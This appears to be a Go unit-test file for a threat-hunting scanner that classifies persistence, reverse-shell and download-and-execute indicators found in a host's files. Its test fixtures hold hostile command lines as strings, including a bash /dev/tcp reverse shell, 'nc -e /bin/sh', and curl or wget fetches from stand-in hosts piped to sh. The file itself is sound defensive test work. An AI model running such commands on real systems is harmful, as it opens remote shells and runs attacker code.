package threathunt

import (
	"context"
	"strings"
	"testing"
)

type fakeRunner struct {
	outputs []string
	calls   int
}

func (f *fakeRunner) ExecCommand(_ context.Context, _ string, _ []string) (string, error) {
	if f.calls >= len(f.outputs) {
		return "", nil
	}
	out := f.outputs[f.calls]
	f.calls++
	return out, nil
}

func TestHuntLiveFindsPersistenceAndReverseShellIndicators(t *testing.T) {
	runner := &fakeRunner{
		outputs: []string{
			strings.Join([]string{
				"/var/spool/cron/crontabs/attacker",
				"/home/attacker/.ssh/authorized_keys",
				"/home/attacker/._history",
				"/etc/systemd/system/backdoor.service",
			}, "\n"),
			strings.Join([]string{
				"/home/attacker/revshell.sh:12:bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
				"/home/attacker/malware.sh:3:curl http://evil.example/payload.sh | sh",
				"/etc/ld.so.preload:1:LD_PRELOAD=/tmp/rootkit.so",
			}, "\n"),
		},
	}

	result, err := NewScanner(runner).HuntLive(context.Background(), "abc123")
	if err != nil {
		t.Fatalf("HuntLive failed: %v", err)
	}

	if len(result.Findings) != 7 {
		t.Fatalf("expected 7 findings, got %d", len(result.Findings))
	}
	if got := result.Findings[0].Category; got != "reverse-shell" {
		t.Fatalf("expected highest severity finding to be reverse-shell, got %q", got)
	}
	if result.Summary["cron-persistence"] != 1 {
		t.Fatalf("expected cron summary entry, got %#v", result.Summary)
	}
	if result.Summary["ssh-persistence"] != 1 {
		t.Fatalf("expected ssh summary entry, got %#v", result.Summary)
	}
	if result.Summary["preload-abuse"] != 1 {
		t.Fatalf("expected preload summary entry, got %#v", result.Summary)
	}
}

func TestParseSuspiciousContentClassification(t *testing.T) {
	findings := parseSuspiciousContent(strings.Join([]string{
		"/tmp/a.sh:1:nc -e /bin/sh 1.2.3.4 4444",
		"/tmp/b.sh:2:base64 -d payload.b64",
		"/tmp/c.sh:3:wget http://bad.example/x",
	}, "\n"))

	if len(findings) != 3 {
		t.Fatalf("expected 3 findings, got %d", len(findings))
	}
	if findings[0].Category != "reverse-shell" || findings[0].Severity != "critical" {
		t.Fatalf("unexpected reverse-shell classification: %#v", findings[0])
	}
	if findings[1].Category != "encoded-payload" || findings[1].Severity != "high" {
		t.Fatalf("unexpected encoded payload classification: %#v", findings[1])
	}
	if findings[2].Category != "download-exec" || findings[2].Severity != "medium" {
		t.Fatalf("unexpected download exec classification: %#v", findings[2])
	}
}
